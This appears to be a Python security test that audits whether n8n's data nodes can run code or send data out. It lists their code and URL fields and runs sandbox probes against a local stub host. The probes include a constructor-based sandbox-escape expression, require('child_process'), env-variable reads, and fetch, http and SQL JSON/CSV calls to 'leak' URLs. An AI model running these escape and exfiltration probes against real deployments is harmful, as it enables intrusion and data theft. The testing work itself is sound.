"""Q10 (D12): can any of n8n's data nodes send data out or run code? Reads each node's own description in this
n8n, then runs the expression engine every node shares, and Sort's code mode, by hand.
"""

import time

from lib import B, Raw, Rest, _send, create, execution, link, node, stub_get, wait_for

raw = Raw("q10")
owner = Rest("owner")
CANDIDATES = ["filter", "switch", "set", "limit", "sort", "aggregate", "splitOut", "removeDuplicates", "summarize", "renameKeys", "dateTime",
              "compareDatasets", "itemLists", "splitInBatches", "crypto", "markdown", "html", "xml", "wait", "executeWorkflow", "respondToWebhook",
              "executionData", "stopAndError", "if", "merge", "noOp"]
CODE_EDITORS = {"codeNodeEditor", "jsEditor", "sqlEditor", "htmlEditor", "cssEditor"}

st, types = _send(owner.op, "GET", B + "/types/nodes.json")
latest = {}
for t in types:
    if t["name"].startswith("n8n-nodes-base."):
        v = max(t["version"]) if isinstance(t["version"], list) else t["version"]
        if t["name"] not in latest or v >= latest[t["name"]][0]:
            latest[t["name"]] = (v, t)


def walk(props, out, path=""):
    for p in props or []:
        name = f"{path}{p.get('name')}"
        ed = (p.get("typeOptions") or {}).get("editor")
        if ed in CODE_EDITORS or p.get("name") in ("jsCode", "pythonCode", "functionCode", "code"):
            out["code"].add(f"{name} ({ed or p.get('type')})")
        if "url" in (p.get("name") or "").lower():
            out["url"].add(name)
        if p.get("name") == "workflowId" or "workflow" in (p.get("name") or "").lower() and p.get("type") in ("workflowSelector", "resourceLocator"):
            out["calls_workflow"].add(name)
        walk(p.get("options"), out, name + ".")
        walk(p.get("values"), out, name + ".")


for short in CANDIDATES:
    entry = latest.get(f"n8n-nodes-base.{short}")
    if not entry:
        raw(f"{short}", "not in this n8n")
        continue
    v, t = entry
    out = {"code": set(), "url": set(), "calls_workflow": set()}
    walk(t.get("properties"), out)
    raw(f"{short} v{v}", {"credentials": [c["name"] for c in t.get("credentials") or []], "webhooks": len(t.get("webhooks") or []),
                         "requestDefaults": bool(t.get("requestDefaults")), "code fields": sorted(out["code"]), "url fields": sorted(out["url"]),
                         "calls another workflow": sorted(out["calls_workflow"])})

probes = {
    "process": "={{ typeof process }}",
    "require": "={{ typeof require }}",
    "fetch": "={{ typeof fetch }}",
    "globalThis": "={{ Object.keys(globalThis).slice(0, 8).join(',') }}",
    "process.env": "={{ String(Object.keys(process.env || {}).length) }}",
    "require call": "={{ (() => { try { return typeof require('child_process') } catch (e) { return 'refused: ' + e.message } })() }}",
    "fetch call": "={{ (() => { try { fetch('http://stub:8041/leak-expression'); return 'called' } catch (e) { return 'refused: ' + e.message } })() }}",
}


def fields(values):
    return {"assignments": {"assignments": [{"id": f"a{i}", "name": k, "value": v, "type": "string"} for i, (k, v) in enumerate(values.items())]}, "options": {}}


def run_by_hand(label, nodes, connections, last):
    w = create(label, nodes, connections, raw=raw)
    st, r = owner.call("POST", f"/workflows/{w['id']}/run", {"destinationNode": {"nodeName": last, "mode": "inclusive"}})
    eid = (r.get("data") or {}).get("executionId")
    ex = wait_for(lambda: (e := execution(eid)) and e["status"] not in ("new", "running") and e, 90)
    rd = ex["data"]["resultData"]
    for n in nodes[1:]:
        runs = rd["runData"].get(n["name"]) or []
        if runs and runs[0].get("error"):
            raw(f"{n['name']}: error", runs[0]["error"].get("message"))
        elif runs:
            raw(f"{n['name']}: output", runs[0]["data"]["main"][0][0]["json"] if runs[0]["data"]["main"][0] else [])
    raw(f"{label}: execution status", [ex["status"], (rd.get("error") or {}).get("message")])


soft = {"onError": "continueRegularOutput"}
SORT_CODE = """if (!globalThis.p7) {
  globalThis.p7 = 1;
  try { fetch('http://stub:8041/leak-sort-fetch').catch(() => {}); } catch (e) {}
  try { this.helpers.httpRequest({ url: 'http://stub:8041/leak-sort-helpers' }).catch(() => {}); } catch (e) {}
  try { require('http').get('http://stub:8041/leak-sort-require'); } catch (e) {}
}
return a.json.list - b.json.list;"""
run_by_hand("q10 expression and code probes", [
    node("Run by hand", "n8n-nodes-base.manualTrigger", {}, (0, 0)),
    node("Env probe", "n8n-nodes-base.set", fields({"env": "={{ $env.WAB_NODE_KEY ? 'readable' : 'empty' }}"}), (200, 0), tv=3.4, **soft),
    node("Escape probe", "n8n-nodes-base.set", fields({"escape": "={{ this.constructor.constructor('return typeof process')() }}"}), (400, 0), tv=3.4, **soft),
    node("Other probes", "n8n-nodes-base.set", fields(probes), (600, 0), tv=3.4, **soft),
    node("Two items", "n8n-nodes-base.set", {"assignments": {"assignments": [{"id": "l", "name": "list", "value": "={{ [2, 1] }}", "type": "array"}]}, "options": {}}, (800, 0), tv=3.4),
    node("Split Out", "n8n-nodes-base.splitOut", {"fieldToSplitOut": "list"}, (1000, 0)),
    node("Sort by code", "n8n-nodes-base.sort", {"type": "code", "code": SORT_CODE}, (1200, 0), **soft),
], link(("Run by hand", "Env probe"), ("Env probe", "Escape probe"), ("Escape probe", "Other probes"), ("Other probes", "Two items"), ("Two items", "Split Out"), ("Split Out", "Sort by code")), "Sort by code")

for i, query in enumerate(['SELECT * FROM JSON("http://stub:8041/leak-json")', 'SELECT * FROM CSV("http://stub:8041/leak-csv")']):
    merge = node(f"Merge by SQL {i}", "n8n-nodes-base.merge", {"mode": "combineBySql", "query": query}, (200, 0), tv=3.2, **soft)
    conns = {"Run by hand": {"main": [[{"node": merge["name"], "type": "main", "index": 0}, {"node": merge["name"], "type": "main", "index": 1}]]}}
    run_by_hand(f"q10 Merge SQL reaching out ({query})", [node("Run by hand", "n8n-nodes-base.manualTrigger", {}, (0, 0)), merge], conns, merge["name"])
time.sleep(2)
raw("requests the stand-in API received from anything but our nodes", stub_get()["other_requests"])
